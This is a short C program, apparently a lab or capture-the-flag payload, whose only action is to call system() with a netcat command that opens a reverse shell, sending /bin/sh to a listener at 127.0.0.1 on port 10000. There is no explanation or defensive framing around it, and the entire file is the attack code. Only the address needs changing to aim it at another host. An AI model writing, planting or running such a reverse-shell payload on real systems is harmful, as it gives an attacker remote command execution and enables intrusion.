#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[]) {
	system("nc.traditional -e /bin/sh 127.0.0.1 10000");
}
